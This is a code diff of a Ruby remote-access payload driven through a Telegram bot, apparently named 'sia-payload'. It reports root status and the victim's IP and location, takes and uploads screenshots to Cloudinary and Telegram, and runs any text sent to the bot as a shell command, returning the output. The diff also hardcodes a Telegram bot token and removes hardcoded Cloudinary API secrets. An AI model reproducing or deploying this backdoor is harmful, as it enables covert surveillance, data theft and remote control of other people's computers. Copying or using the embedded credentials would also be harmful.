@@ -6,13 +6,13 @@ require "telegram/bot"
 require "cloudinary"
 require "json"
 require "dropbox_api"
+#require modules
+require_relative "lib/check_root"
+require_relative "lib/info"
+require_relative "lib/screenShot"
 
 #Token bot
-$TOKEN = "" 
-
-def check_root
-    isRoot = Process.uid.zero?
-end
+$TOKEN = "304212840:AAHy8zMXUrWopY0SUzuwMkU7GpLxAil69HQ"
 
 Telegram::Bot::Client.run($TOKEN, logger: Logger.new($stdout)) do |bot|
     begin
@@ -21,16 +21,20 @@ Telegram::Bot::Client.run($TOKEN, logger: Logger.new($stdout)) do |bot|
 
             case message.text
             when '/start'
-                isRoot = check_root
+                #create a class
+                c_checkRoot = Check_Root.new
+                #save output in vaariable
+                isRoot = c_checkRoot.check_root
+                #send to telegram
                 bot.api.send_message(chat_id: message.chat.id, text: "Hello, #{message.from.first_name}\n\n[+] Bot and payload is Online\nAccess system is Root? : #{isRoot}\n\nEnter /help to see commands!")
-                
+
             #Help command
             when '/help'
                 help = """Help:
     /info => To Get ip and system info
     /screenShot => Get ScreenShot of system
     /upload  =>  Uploading File (Demo)
-    
+
 for run shell command just send without `/` and \nRecive result.
 
 Coded By : ViRuS007
@@ -43,37 +47,26 @@ Github: http://github.com/shayanzare/sia-payload
 
             #Get info of system
             when '/info'
-                host = Socket.gethostname
-                res = Net::HTTP.get(URI("http://ipinfo.io/json"))
-                resf = res.to_s
-                parsed = JSON.parse(resf)
-
-                bot.api.send_message(chat_id: message.chat.id, text: "[*] IP Adress : #{parsed["ip"]} \n[*] Host Name : #{parsed["hostname"]} \n
-[*] City : #{parsed["city"]} \n[*] Region : #{parsed["region"]} \n
-[*] Country : #{parsed["country"]} \n[*] Locations : #{parsed["loc"]} \n
-[*] Org : #{parsed["org"]}")
+              c_info = Info.new
+              info = c_info.get_info
+              #sen output to telegram
+              bot.api.send_message(chat_id: message.chat.id, text: info)
 
             #Take screenshot with terminal (import) and cmd
             when "/screenShot"
                 #check operatations system
                 if RUBY_PLATFORM =~ /win32/
                     #windows platform
-                    
+
                 else
                     #linux platform
                     bot.api.send_message(chat_id: message.chat.id, text: "[!] Taking Screenshot and Uploading...\nPlease wait...")
-                    #get screenshot with shell linux
-                    res = %x{import -window root -resize 1360x768 -delay 200 screenshot.png}
-                    #setting Cloudinary api
-                    auth = {
-                        cloud_name: "dnno5u4ug",
-                        api_key:    "577794173378992",
-                        api_secret: "5MFNU2rcqMWg69lCHJDcxX15I_Y"
-                    }
-                    #sneding photo for upload
-                    s = Cloudinary::Uploader.upload("screenshot.png", auth)
+
+                    screenshot = ScreenShot.new
+                    get_screen_l = screenshot.get_screen_linux
+
                     #send result to telegram bot
-                    bot.api.send_message(chat_id: message.chat.id, text: "[+] File Succesful Uploaded!\nURLs : \n#{s}")
+                    bot.api.send_message(chat_id: message.chat.id, text: "[+] File Succesful Uploaded!\nURLs : \n#{get_screen_l}")
                     #upload in telegram
                     bot.api.send_photo(chat_id: message.chat.id, photo: Faraday::UploadIO.new('screenshot.png', 'image/png'))
                 end
@@ -84,7 +77,7 @@ Github: http://github.com/shayanzare/sia-payload
                 bot.api.sendMessage(chat_id: message.chat.id, text: "[+] Result :\n\n#{result}")
         end
     end
-    rescue 
+    rescue
         puts "Error"
         retry
     end
